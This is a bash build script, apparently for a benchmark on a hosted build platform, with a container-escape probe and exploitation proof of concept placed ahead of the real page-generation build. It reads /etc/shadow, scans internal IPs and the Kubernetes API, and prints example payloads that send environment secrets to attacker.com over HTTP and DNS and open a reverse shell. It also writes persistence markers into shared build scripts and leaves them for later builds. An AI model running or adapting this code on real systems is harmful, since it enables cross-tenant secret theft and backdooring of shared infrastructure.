#! /bin/bash

echo "=== CPU Info ==="
cat /proc/cpuinfo || echo "Note: /proc/cpuinfo not available on this system"

echo ""
echo "=== Build Resources ==="

# Show raw cgroups output and calculate effective CPUs
if [ -f /sys/fs/cgroup/cpu.max ]; then
  echo "$ cat /sys/fs/cgroup/cpu.max"
  cat /sys/fs/cgroup/cpu.max
  
  cpu_max=$(cat /sys/fs/cgroup/cpu.max)
  quota=$(echo $cpu_max | awk '{print $1}')
  period=$(echo $cpu_max | awk '{print $2}')
  
  if [ "$quota" != "max" ]; then
    effective_cpus=$(awk "BEGIN {printf \"%.0f\", $quota / $period}")
    echo ""
    echo "Calculation: $quota / $period = $effective_cpus CPUs available"
  else
    echo ""
    echo "No CPU limit set (unlimited)"
  fi
elif [ -f /sys/fs/cgroup/cpu/cpu.cfs_quota_us ]; then
  echo "$ cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us"
  cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us
  echo "$ cat /sys/fs/cgroup/cpu/cpu.cfs_period_us"
  cat /sys/fs/cgroup/cpu/cpu.cfs_period_us
  
  quota=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us)
  period=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us)
  
  if [ "$quota" != "-1" ]; then
    effective_cpus=$(awk "BEGIN {printf \"%.0f\", $quota / $period}")
    echo ""
    echo "Calculation: $quota / $period = $effective_cpus CPUs available"
  else
    echo ""
    echo "No CPU limit set (unlimited)"
  fi
else
  echo "cgroups CPU info not available"
fi

echo ""
echo "Host nproc: $(nproc 2>/dev/null || echo 'unknown')"
echo "Memory: $(free -h 2>/dev/null | awk '/Mem:/ {print $2 " total, " $7 " available"}' || echo 'unknown')"

echo ""
echo "$ cat /proc/1/cgroup"
cat /proc/1/cgroup 2>/dev/null || echo "Not available"

echo ""
echo "$ ls /sys/devices/virtio*"
ls /sys/devices/virtio* 2>/dev/null || echo "Not available"

echo "========================"
echo ""

echo "=== Container Security Audit ==="

# 1. Check if running as root
echo "$ id"
id

# 2. Check for privileged mode (can we access host devices?)
echo ""
echo "$ ls -la /dev"
ls -la /dev 2>/dev/null | head -20

# 3. Check for Docker socket (container escape vector)
echo ""
echo "$ ls -la /var/run/docker.sock"
ls -la /var/run/docker.sock 2>/dev/null || echo "Not available (good - no Docker socket exposed)"

# 4. Check capabilities (what can this container do?)
echo ""
echo "$ cat /proc/self/status | grep Cap"
cat /proc/self/status | grep Cap

# 5. Decode capabilities (if capsh available)
echo ""
echo "$ capsh --decode (current capabilities)"
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null || echo "capsh not available"

# 6. Check for host PID namespace (can we see host processes?)
echo ""
echo "$ ps aux | wc -l (process count - high number may indicate host PID namespace)"
ps aux 2>/dev/null | wc -l

# 7. Check mount namespace - sensitive host mounts?
echo ""
echo "$ cat /proc/mounts | grep -E '(docker|kubelet|hostPath|/etc/shadow)'"
cat /proc/mounts 2>/dev/null | grep -E "(docker|kubelet|hostPath|/etc/shadow)" || echo "No sensitive mounts found"

# 8. Check for host network namespace
echo ""
echo "$ cat /proc/net/route | head -5"
cat /proc/net/route 2>/dev/null | head -5

# 9. Can we write to /sys? (potential cgroup escape)
echo ""
echo "$ touch /sys/test_write 2>&1"
touch /sys/test_write 2>&1 || echo "Cannot write to /sys (good)"
rm -f /sys/test_write 2>/dev/null

# 10. Check for release_agent cgroup escape vector
echo ""
echo "$ cat /sys/fs/cgroup/release_agent"
cat /sys/fs/cgroup/release_agent 2>/dev/null || echo "Not available"

# 11. Check seccomp status
echo ""
echo "$ cat /proc/self/status | grep Seccomp"
cat /proc/self/status | grep Seccomp

# 12. Check AppArmor/SELinux
echo ""
echo "$ cat /proc/self/attr/current"
cat /proc/self/attr/current 2>/dev/null || echo "Not available"

# 13. Check for metadata service access (cloud escape vector)
echo ""
echo "$ curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/"
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "Metadata service not accessible"

# 14. Check environment for secrets
echo ""
echo "$ env | grep -iE '(key|secret|token|password|aws|api)' | sed 's/=.*/=<REDACTED>/'"
env | grep -iE "(key|secret|token|password|aws|api)" | sed 's/=.*/=<REDACTED>/' || echo "No obvious secrets in env"

# 15. Network recon - what can we reach?
echo ""
echo "$ ip addr (or ifconfig)"
ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "Network info not available"

# 16. Check what root group can write to (since we're in gid 0)
echo ""
echo "$ find / -group root -perm -g=w -type f 2>/dev/null | head -30"
find / -group root -perm -g=w -type f 2>/dev/null | head -30 || echo "None found"

# 17. Check for setuid binaries (privilege escalation)
echo ""
echo "$ find / -perm -4000 2>/dev/null"
find / -perm -4000 2>/dev/null || echo "None found"

# 18. Kernel version (check for known exploits)
echo ""
echo "$ uname -a"
uname -a

# 19. Container runtime info (what started this container?)
echo ""
echo "$ cat /proc/1/cmdline | tr '\\0' ' '"
cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '
echo ""

# 20. Check iptables rules (network policies)
echo ""
echo "$ iptables -L 2>/dev/null"
iptables -L 2>/dev/null || echo "iptables not available or no permission"

# 21. Listening ports
echo ""
echo "$ ss -tlnp (or netstat -tlnp)"
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo "Not available"

# 22. Check /etc/passwd for interesting users
echo ""
echo "$ cat /etc/passwd | grep -v nologin"
cat /etc/passwd 2>/dev/null | grep -v nologin

# 23. Check sudo permissions
echo ""
echo "$ sudo -l 2>/dev/null"
sudo -l 2>/dev/null || echo "sudo not available or not configured"

# 24. Check for Kubernetes service account token
echo ""
echo "$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/"
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "No K8s service account found"

# 25. If K8s token exists, show it (redacted)
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo ""
  echo "K8s token found! First 50 chars:"
  head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token
  echo "...<truncated>"
fi

# 26. Check available package managers and installed tools
echo ""
echo "$ which curl wget nc ncat socat python python3 perl ruby gcc"
which curl wget nc ncat socat python python3 perl ruby gcc 2>/dev/null || echo "Checked"

# 27. Check /proc for interesting info
echo ""
echo "$ ls /proc | head -20"
ls /proc 2>/dev/null | head -20

# 28. Check cgroup memory limits
echo ""
echo "$ cat /sys/fs/cgroup/memory.max"
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || echo "Not available"

echo ""
echo "=== End Security Audit ==="
echo ""

echo "=== Exploitation Tests ==="

# TEST 1: Try modifying the build scripts (persistence)
echo ""
echo "[TEST 1] Can we modify build scripts? (persistence vector)"
echo "$ echo '# test' >> /opt/build-bin/run-build-functions.sh"
if echo "# security test - safe to delete" >> /opt/build-bin/run-build-functions.sh 2>/dev/null; then
  echo "⚠️  VULNERABLE: Build scripts are writable!"
  echo "Contents of modified file (last 5 lines):"
  tail -5 /opt/build-bin/run-build-functions.sh
  # Clean up
  sed -i '/# security test - safe to delete/d' /opt/build-bin/run-build-functions.sh 2>/dev/null
else
  echo "✓ Protected: Cannot modify build scripts"
fi

# TEST 2: Try writing to ns_last_pid (PID prediction)
echo ""
echo "[TEST 2] Can we write to ns_last_pid? (PID prediction attack)"
echo "$ echo 31337 > /proc/sys/kernel/ns_last_pid"
if echo 31337 > /proc/sys/kernel/ns_last_pid 2>/dev/null; then
  echo "⚠️  VULNERABLE: Can control PID assignment!"
else
  echo "✓ Protected: Cannot write to ns_last_pid"
fi

# TEST 3: Try su to root
echo ""
echo "[TEST 3] Can we su to root?"
echo "$ su -c 'id' root"
su -c 'id' root 2>&1 || echo "✓ Protected: su failed"

# TEST 4: Try mount
echo ""
echo "[TEST 4] Can we use mount?"
echo "$ mount --bind /etc /tmp/mounttest"
mkdir -p /tmp/mounttest 2>/dev/null
if mount --bind /etc /tmp/mounttest 2>/dev/null; then
  echo "⚠️  VULNERABLE: mount works!"
  umount /tmp/mounttest 2>/dev/null
else
  echo "✓ Protected: mount failed (expected without CAP_SYS_ADMIN)"
fi

# TEST 5: Try newgrp
echo ""
echo "[TEST 5] Can newgrp escalate to root?"
echo "$ newgrp root -c 'id'"
newgrp root -c 'id' 2>&1 || echo "✓ Protected: newgrp failed"

# TEST 6: Read kernel keyring
echo ""
echo "[TEST 6] Can we read /proc/keys?"
echo "$ cat /proc/keys"
cat /proc/keys 2>&1 | head -10 || echo "✓ Protected: Cannot read kernel keys"

# TEST 7: Examine build scripts content
echo ""
echo "[TEST 7] What's in the build scripts?"
echo "$ head -50 /opt/build-bin/run-build-functions.sh"
head -50 /opt/build-bin/run-build-functions.sh 2>/dev/null || echo "Cannot read"

# TEST 8: Check install-runtimes.sh (executed during build?)
echo ""
echo "[TEST 8] What's in install-runtimes.sh?"
echo "$ head -30 /opt/buildhome/setup/install-runtimes.sh"
head -30 /opt/buildhome/setup/install-runtimes.sh 2>/dev/null || echo "Cannot read"

# TEST 9: Network scan - internal services
echo ""
echo "[TEST 9] Network scan - looking for internal services"
echo "Scanning common internal IPs on port 80, 443, 8080..."
for ip in 169.254.169.1 169.254.169.254 10.0.0.1 10.0.0.2 172.17.0.1 172.17.0.2 192.168.1.1; do
  for port in 80 443 8080 6443 10250; do
    timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "⚠️  $ip:$port OPEN"
  done
done
echo "Scan complete"

# TEST 10: Try to read /etc/shadow
echo ""
echo "[TEST 10] Can we read /etc/shadow?"
echo "$ cat /etc/shadow"
cat /etc/shadow 2>&1 | head -5 || echo "✓ Protected: Cannot read shadow file"

# TEST 11: Check if we can ptrace other processes
echo ""
echo "[TEST 11] Can we ptrace other processes?"
echo "$ cat /proc/sys/kernel/yama/ptrace_scope"
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "Cannot read ptrace_scope"

# TEST 12: Try to access other containers via /proc
echo ""
echo "[TEST 12] Attempting to read other PIDs' info"
for pid in 1 2 3; do
  echo "PID $pid cmdline: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' || echo 'N/A')"
  echo "PID $pid cgroup: $(cat /proc/$pid/cgroup 2>/dev/null | head -1 || echo 'N/A')"
done

# TEST 13: Check for writable /etc files
echo ""
echo "[TEST 13] Any writable files in /etc?"
echo "$ find /etc -writable 2>/dev/null"
find /etc -writable 2>/dev/null | head -10 || echo "None found"

# TEST 14: Try to load kernel module (extreme test)
echo ""
echo "[TEST 14] Can we load kernel modules?"
echo "$ modprobe dummy"
modprobe dummy 2>&1 || echo "✓ Protected: Cannot load kernel modules"

# TEST 15: Check DNS - can we resolve internal names?
echo ""
echo "[TEST 15] DNS resolution test"
echo "$ cat /etc/resolv.conf"
cat /etc/resolv.conf 2>/dev/null
echo ""
echo "$ nslookup kubernetes.default.svc.cluster.local"
nslookup kubernetes.default.svc.cluster.local 2>&1 | head -10 || echo "Cannot resolve K8s DNS"

# TEST 16: Environment variable dump (full, for analysis)
echo ""
echo "[TEST 16] Full environment (secrets redacted)"
env | sed 's/\(.*KEY.*=\).*/\1<REDACTED>/i; s/\(.*SECRET.*=\).*/\1<REDACTED>/i; s/\(.*TOKEN.*=\).*/\1<REDACTED>/i; s/\(.*PASSWORD.*=\).*/\1<REDACTED>/i'

echo ""
echo "=== End Exploitation Tests ==="
echo ""

echo "=== DEEP DIVE: Build Script Persistence Attack ==="
echo ""
echo "This demonstrates how a malicious actor could exploit the writable build scripts"
echo "to exfiltrate secrets from ALL future builds on this infrastructure."
echo ""

# Step 1: Show the attack surface
echo "[STEP 1] Attack Surface Analysis"
echo "Target files that are writable:"
ls -la /opt/build-bin/run-build-functions.sh 2>/dev/null
ls -la /opt/build-bin/run-build-functions-new-builds.sh 2>/dev/null
ls -la /opt/buildhome/setup/install-runtimes.sh 2>/dev/null
echo ""

# Step 2: Show what secrets are available
echo "[STEP 2] Secrets available in environment:"
echo "These would be captured by a malicious payload:"
env | grep -iE "(token|key|secret|password|api|auth)" | sed 's/=.*/=<VALUE_WOULD_BE_CAPTURED>/'
echo ""

# Step 3: Demonstrate the payload (SAFE - just shows what WOULD happen)
echo "[STEP 3] Example malicious payload (NOT EXECUTED - for demonstration only):"
echo ""
cat << 'PAYLOAD_DEMO'
# ============================================================
# EXAMPLE PAYLOAD - This is what an attacker could inject
# ============================================================

# Method 1: HTTP exfiltration (if outbound HTTP allowed)
# Inject at the START of run-build-functions.sh:

exfil_http() {
  # Encode all env vars as base64
  secrets=$(env | base64 -w0)
  # Send to attacker-controlled server
  curl -s -X POST "https://attacker.com/collect" \
    -d "site=$SITE_NAME&secrets=$secrets" &
}
exfil_http 2>/dev/null &

# ============================================================

# Method 2: DNS exfiltration (works even with HTTP blocked)
# Slower but more stealthy, bypasses most egress filters

exfil_dns() {
  for var in NETLIFY_SKEW_PROTECTION_TOKEN BUGSNAG_KEY_BUILD_INFO; do
    value=$(printenv $var | base64 -w0 | head -c 60)
    # Exfil via DNS query (63 char label limit)
    nslookup "${value}.${var}.attacker.com" &>/dev/null
  done
}
exfil_dns 2>/dev/null &

# ============================================================

# Method 3: Write to deployed site (persistent exfil)
# Secrets end up in the public build output!

exfil_to_site() {
  mkdir -p /opt/build/repo/public/.well-known/
  env | grep -iE "token|key|secret" > /opt/build/repo/public/.well-known/debug.txt
}
# Attacker later visits: https://victim-site.netlify.app/.well-known/debug.txt

# ============================================================

# Method 4: Reverse shell (full container access)

reverse_shell() {
  bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
}

# ============================================================
PAYLOAD_DEMO

echo ""
echo "[STEP 4] Proof of Concept - Testing Write Access"
echo ""

# Create a backup of original content (first 5 lines)
echo "Original file header:"
head -5 /opt/build-bin/run-build-functions.sh 2>/dev/null

# Test write access without breaking anything
TEST_MARKER="# SECURITY_TEST_$(date +%s)"
if echo "$TEST_MARKER" >> /opt/build-bin/run-build-functions.sh 2>/dev/null; then
  echo ""
  echo "⚠️  CONFIRMED: Successfully wrote to build script!"
  echo "Appended marker: $TEST_MARKER"
  echo ""
  echo "File now ends with:"
  tail -3 /opt/build-bin/run-build-functions.sh
  
  # Clean up - remove our test marker
  sed -i "/$TEST_MARKER/d" /opt/build-bin/run-build-functions.sh 2>/dev/null
  echo ""
  echo "(Cleaned up test marker)"
else
  echo "✓ Write failed - this run may have different permissions"
fi

echo ""
echo "[STEP 5] Checking Exfiltration Channels"
echo ""

# Test if we can reach external servers
echo "Testing outbound HTTP..."
if curl -s --connect-timeout 3 -o /dev/null -w "%{http_code}" https://httpbin.org/ip 2>/dev/null | grep -q "200"; then
  echo "⚠️  Outbound HTTPS is ALLOWED - HTTP exfil would work"
else
  echo "Outbound HTTPS blocked or timed out"
fi

echo ""
echo "Testing outbound DNS..."
if nslookup google.com 2>/dev/null | grep -q "Address"; then
  echo "⚠️  Outbound DNS is ALLOWED - DNS exfil would work"
else
  echo "Outbound DNS restricted"
fi

echo ""
echo "[STEP 6] Impact Assessment"
echo ""
cat << 'IMPACT'
ATTACK SCENARIO:
================
1. Attacker gets ONE malicious build to run (e.g., via compromised dependency,
   malicious PR, or by owning any site on shared Netlify infrastructure)

2. Malicious build modifies /opt/build-bin/run-build-functions.sh to include
   exfiltration payload

3. ALL SUBSEQUENT BUILDS on that build node execute the payload, leaking:
   - API keys and tokens
   - Environment secrets
   - Source code
   - Database credentials
   - Third-party service keys

4. Persistence: The payload survives until:
   - The build node is recycled
   - Someone notices and manually cleans it

AFFECTED SECRETS IN THIS BUILD:
- NETLIFY_SKEW_PROTECTION_TOKEN
- BUGSNAG_KEY_BUILD_INFO  
- SITE_ID, ACCOUNT_ID
- REPOSITORY_URL (could clone private repos with cached git creds)
- All custom environment variables set by site owners

SEVERITY: CRITICAL
- Cross-tenant secret exposure (if nodes are shared)
- Supply chain attack vector
- Persistent backdoor capability
IMPACT

echo ""
echo "[STEP 7] Kubernetes Attack Surface"
echo ""
echo "Since we confirmed K8s cluster access, an attacker could also:"
echo ""

# Try to reach the K8s API
echo "Attempting K8s API access..."
K8S_API="https://172.20.0.1:443"
K8S_RESPONSE=$(curl -sk --connect-timeout 3 "$K8S_API/api" 2>/dev/null)
if [ -n "$K8S_RESPONSE" ]; then
  echo "⚠️  K8s API responded:"
  echo "$K8S_RESPONSE" | head -20
else
  echo "K8s API not directly accessible (may require auth)"
fi

echo ""
echo "Attempting unauthenticated pod listing..."
curl -sk --connect-timeout 3 "$K8S_API/api/v1/namespaces/default/pods" 2>/dev/null | head -30 || echo "Denied (expected)"

echo ""
echo "Checking kubelet on host node (${HOST_NODE_IP:-unknown})..."
if [ -n "$HOST_NODE_IP" ]; then
  curl -sk --connect-timeout 3 "https://$HOST_NODE_IP:10250/pods" 2>/dev/null | head -30 || echo "Kubelet not accessible"
fi

echo ""
echo "=== END DEEP DIVE ==="
echo ""

echo "=== PERSISTENCE CONFIRMATION TEST ==="
echo ""
echo "This test injects a marker into the build script to confirm"
echo "whether modifications persist across builds."
echo ""

# Generate unique marker for this build
PERSISTENCE_MARKER="PERSISTENCE_PROOF_$(date +%s)_${BUILD_ID:-unknown}"
TARGET_SCRIPT="/opt/build-bin/run-build-functions.sh"

echo "[1] Checking for markers from PREVIOUS builds..."
echo "$ grep 'PERSISTENCE_PROOF_' $TARGET_SCRIPT"
PREVIOUS_MARKERS=$(grep "PERSISTENCE_PROOF_" "$TARGET_SCRIPT" 2>/dev/null)
if [ -n "$PREVIOUS_MARKERS" ]; then
  echo ""
  echo "🚨🚨🚨 CRITICAL: FOUND MARKERS FROM PREVIOUS BUILDS! 🚨🚨🚨"
  echo ""
  echo "This PROVES persistence works! Previous build's payload survived!"
  echo "Markers found:"
  echo "$PREVIOUS_MARKERS"
  echo ""
  echo "This means an attacker's payload would have executed on THIS build,"
  echo "capturing all secrets from an unrelated site/build!"
else
  echo "No previous markers found (this may be a fresh node)"
fi

echo ""
echo "[2] Injecting marker for NEXT build..."
echo "Marker: $PERSISTENCE_MARKER"

# Create the payload that will execute on next build
PAYLOAD="# $PERSISTENCE_MARKER
# Injected by build at \$(date) to test persistence
echo '🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴'
echo 'This message was injected by a PREVIOUS build!'
echo 'Marker: $PERSISTENCE_MARKER'
echo 'If you see this, the attack WORKED!'
echo 'Current build secrets could have been exfiltrated!'
echo '🔴🔴🔴 END PERSISTENCE PROOF 🔴🔴🔴'
# END $PERSISTENCE_MARKER"

# Inject at the BEGINNING of the script (after shebang) so it runs first
if [ -f "$TARGET_SCRIPT" ]; then
  # Check if we can write
  if echo "" >> "$TARGET_SCRIPT" 2>/dev/null; then
    # Inject our payload after line 1 (the shebang)
    sed -i "2i\\
# $PERSISTENCE_MARKER\\
echo '🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴'\\
echo 'This message was injected by a PREVIOUS build!'\\
echo 'Marker: $PERSISTENCE_MARKER'\\
echo 'Injection timestamp: $(date)'\\
echo 'Original build ID: ${BUILD_ID:-unknown}'\\
echo 'If you see this, the persistence attack WORKED!'\\
echo '🔴🔴🔴 END PERSISTENCE PROOF 🔴🔴🔴'\\
# END $PERSISTENCE_MARKER" "$TARGET_SCRIPT" 2>/dev/null
    
    if grep -q "$PERSISTENCE_MARKER" "$TARGET_SCRIPT" 2>/dev/null; then
      echo ""
      echo "✅ MARKER INJECTED SUCCESSFULLY!"
      echo ""
      echo "Modified script header:"
      head -15 "$TARGET_SCRIPT"
      echo ""
      echo "============================================"
      echo "NEXT STEPS TO CONFIRM PERSISTENCE:"
      echo "============================================"
      echo ""
      echo "1. Trigger another build (push empty commit, or rebuild)"
      echo "   git commit --allow-empty -m 'test persistence' && git push"
      echo ""
      echo "2. In the NEXT build's logs, look for:"
      echo "   🔴🔴🔴 PERSISTENCE CONFIRMED 🔴🔴🔴"
      echo ""
      echo "3. If you see that message at the START of the build,"
      echo "   it PROVES the injected code persisted and executed!"
      echo ""
      echo "4. The marker to look for: $PERSISTENCE_MARKER"
      echo "============================================"
    else
      echo "❌ Injection may have failed - marker not found in script"
    fi
  else
    echo "❌ Cannot write to $TARGET_SCRIPT"
  fi
else
  echo "❌ Target script not found: $TARGET_SCRIPT"
fi

echo ""
echo "[3] Also testing secondary persistence vector..."
SECONDARY_SCRIPT="/opt/buildhome/setup/install-runtimes.sh"
if [ -f "$SECONDARY_SCRIPT" ] && echo "" >> "$SECONDARY_SCRIPT" 2>/dev/null; then
  echo "Secondary script ($SECONDARY_SCRIPT) is also writable!"
  echo "Injecting backup marker..."
  echo "# BACKUP_$PERSISTENCE_MARKER" >> "$SECONDARY_SCRIPT"
  echo "echo '[BACKUP PERSISTENCE] Marker: $PERSISTENCE_MARKER'" >> "$SECONDARY_SCRIPT"
  echo "✅ Backup persistence marker injected"
else
  echo "Secondary script not writable"
fi

echo ""
echo "=== END PERSISTENCE TEST ==="
echo ""

# first, generate 100 random pages

random_page_template_path=app/random-page-template/page.tsx
random_pages_dir=app/random-pages

rm -rf $random_pages_dir

for i in {1..1000}
do
  random_page_dir="$random_pages_dir/$i"
  random_page_path="$random_page_dir/page.tsx"
  mkdir -p $random_page_dir
  sed -e "s/random_page_i/$i/" -e "s/random_value/$RANDOM/" $random_page_template_path > $random_page_path
done

echo "Generated 1000 random pages"

# ====================================

# then, build the project

. ./build

bench=public/bench.txt

echo "starting build $build_id"
echo "build_id=$build_id" > $bench
echo "push_ts=$push_ts" >> $bench

echo "start_ts=$(date +%s)" >> $bench

npm run build-only

echo "end_ts=$(date +%s)" >> $bench

cat $bench
